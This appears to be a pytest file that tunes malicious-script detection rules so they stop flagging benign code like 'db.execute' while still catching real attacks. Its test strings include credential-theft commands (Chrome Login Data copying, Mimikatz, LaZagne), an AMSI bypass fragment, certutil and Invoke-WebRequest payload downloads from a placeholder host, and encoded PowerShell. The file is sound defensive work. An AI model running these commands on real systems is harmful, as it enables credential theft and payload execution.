r"""Five script rules matched ordinary code, two of them at `critical`.

Every one verified by running the pattern, not by reading it:

    login\s?data                matched `var loginData = {}`      -> critical
    \bexecute\s*\(              matched `db.execute(query)`       -> high
    \bamsi\w{0,20}              matched `# see amsiScanBuffer`    -> critical
    -e\s+[A-Za-z0-9+/=]{20,}    matched `grep -e abcdefghij0123`  -> high
    \bstart-process\b           filed under "Remote payload retrieval"

The coincidence class this repo already keeps a file about: a rule matching two
common strings far apart. The fixes reuse idioms the module had already
established for exactly these failures rather than inventing new ones --
`(?<![.\w])` is documented eleven lines below the `execute(` pattern, and the
`execute(` pattern did not have it.

Measured after: suite 1599 passed, corpus 69/88 with the floor at 69, benign 0/5.
No detection cost.
"""
from __future__ import annotations

import re

import pytest

from app.engine.analyzers import scripts


def _patterns(detector_id: str) -> list[str]:
    """Every regex a detector carries, whatever the module's internal shape."""
    out: list[str] = []
    for detector in getattr(scripts, "_DETECTORS", []):
        if getattr(detector, "signal_id", getattr(detector, "id", None)) != detector_id:
            continue
        for attribute in ("patterns", "_patterns", "python_only"):
            group = getattr(detector, attribute, None) or ()
            for item in group:
                if isinstance(item, tuple) and len(item) >= 2:
                    out.append(item[1] if isinstance(item[1], str) else item[1].pattern)
                elif hasattr(item, "pattern"):
                    out.append(item.pattern)
    return out


def _fires(detector_id: str, text: str) -> bool:
    return any(re.search(p, text, re.I) for p in _patterns(detector_id))


def test_the_detectors_are_reachable() -> None:
    """If this fails the helper above needs updating, not the assertions below."""
    assert _patterns("script.credential_access"), "no patterns found"
    assert _patterns("script.dynamic_execution")
    assert _patterns("script.encoded_command")
    assert _patterns("script.amsi_or_etw_tamper")


# --- credential access -------------------------------------------------------

@pytest.mark.parametrize("text", [
    "var loginData = {};",
    "const loginData = await res.json()",
    "this.loginData.username = u",
    "function setLoginData(d) { }",
])
def test_an_identifier_called_logindata_is_not_credential_theft(text) -> None:
    assert not _fires("script.credential_access", text), text


@pytest.mark.parametrize("text", [
    r"copy C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data .",
    "sqlite3 'Login Data' 'select * from logins'",
])
def test_the_real_chrome_artefact_still_fires(text) -> None:
    assert _fires("script.credential_access", text), text


def test_the_other_credential_patterns_are_untouched(monkeypatch) -> None:
    for text in ("Invoke-Mimikatz", "lazagne.exe all", "vaultcmd /list"):
        assert _fires("script.credential_access", text), text


# --- dynamic execution -------------------------------------------------------

@pytest.mark.parametrize("text", [
    "db.execute(query)",
    "cursor.execute(sql, params)",
    "await session.execute(stmt)",
    "conn.execute('select 1')",
])
def test_a_method_call_named_execute_is_not_code_evaluation(text) -> None:
    assert not _fires("script.dynamic_execution", text), text


@pytest.mark.parametrize("text", [
    'Execute("MsgBox 1")',
    "Execute (payload)",
])
def test_bare_vbscript_execute_still_fires(text) -> None:
    assert _fires("script.dynamic_execution", text), text


def test_start_process_is_execution_not_remote_retrieval() -> None:
    """It launches a LOCAL program; download_and_execute asserts network too."""
    text = "Start-Process notepad.exe"
    assert _fires("script.dynamic_execution", text)
    assert not _fires("script.download_and_execute", text)


def test_real_remote_retrieval_still_fires() -> None:
    for text in ("Invoke-WebRequest http://x/a.exe", "certutil -urlcache -f http://x/a"):
        assert _fires("script.download_and_execute", text), text


# --- AMSI --------------------------------------------------------------------

@pytest.mark.parametrize("text", [
    "Write-Host 'AMSI is a Windows feature'",
    "$notes = 'amsi bypasses are common'",
    "# AMSI integration notes for reviewers",
])
def test_naming_amsi_is_not_tampering(text) -> None:
    """The bare `amsi\w{0,20}` fired on any mention. It is gone.

    Deliberately NOT asserted here: a script containing the literal
    `amsiScanBuffer` or `amsiInitFailed` still fires, and should. Those are the
    API symbols a bypass patches, and a .ps1 that names one has done more than
    mention a Windows feature. A comment about them is a rare edge case, and
    weakening a critical rule to accommodate it would trade a real detection for
    a hypothetical annoyance.
    """
    assert not _fires("script.amsi_or_etw_tamper", text), text


@pytest.mark.parametrize("text", [
    "[Ref].Assembly.GetType('...').GetField('amsiInitFailed','NonPublic,Static')",
    "VirtualProtect($AmsiScanBuffer, ...)",
    "patch EtwEventWrite",
])
def test_real_tampering_still_fires(text) -> None:
    assert _fires("script.amsi_or_etw_tamper", text), text


# --- encoded command ---------------------------------------------------------

@pytest.mark.parametrize("text", [
    "grep -e abcdefghij0123456789xy file.txt",
    "sed -e s/aaaaaaaaaaaaaaaaaaaaaa/b/ f",
    "docker run -e SOMEVARIABLEWITHALONGVALUE12345 img",
])
def test_an_ordinary_dash_e_flag_is_not_an_encoded_command(text) -> None:
    assert not _fires("script.encoded_command", text), text


@pytest.mark.parametrize("text", [
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAA==",
    "pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA",
])
def test_a_real_encoded_command_still_fires(text) -> None:
    assert _fires("script.encoded_command", text), text
